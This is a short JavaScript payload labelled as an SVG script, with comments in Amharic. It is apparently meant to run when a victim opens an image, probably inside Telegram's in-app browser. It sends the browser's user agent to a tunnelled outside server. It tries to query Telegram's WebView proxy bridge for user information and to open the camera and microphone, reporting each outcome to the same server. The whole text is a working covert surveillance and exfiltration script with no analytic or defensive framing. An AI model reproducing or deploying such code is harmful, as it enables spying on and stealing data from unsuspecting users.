svg.script:
// 
try {
    my_server = "https://5982609c16f0d443-196-191-121-23.serveousercontent.com";

    // 1. መሰረታዊ መረጃ መላክ (IP & Device Info)
    fetch(my_server + "log?info=" + btoa(navigator.userAgent));

    // 2. የቴሌግራም ድልድይን (Proxy) በመጠቀም የውስጥ መረጃ መፈለግ
    if (window.TelegramWebviewProxy) {
        // የቴሌግራምን የውስጥ መረጃ ለመጠየቅ መሞከር
        var data = JSON.stringify({"type": "get_user_info"}); 
        window.TelegramWebviewProxy.postEvent("resize_frame", data);
        fetch(my_server + "log?status=bridge_accessed");
    }

    // 3. ካሜራ ለመክፈት መሞከር (Permission ካለ)
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(function(stream) {
            fetch(my_server + "log?status=camera_opened");
        })
        .catch(function(err) {
            fetch(my_server + "log?error=camera_denied");
        });

} catch(e) {
    fetch(my_server + "error?msg=" + btoa(e.message));
}
//
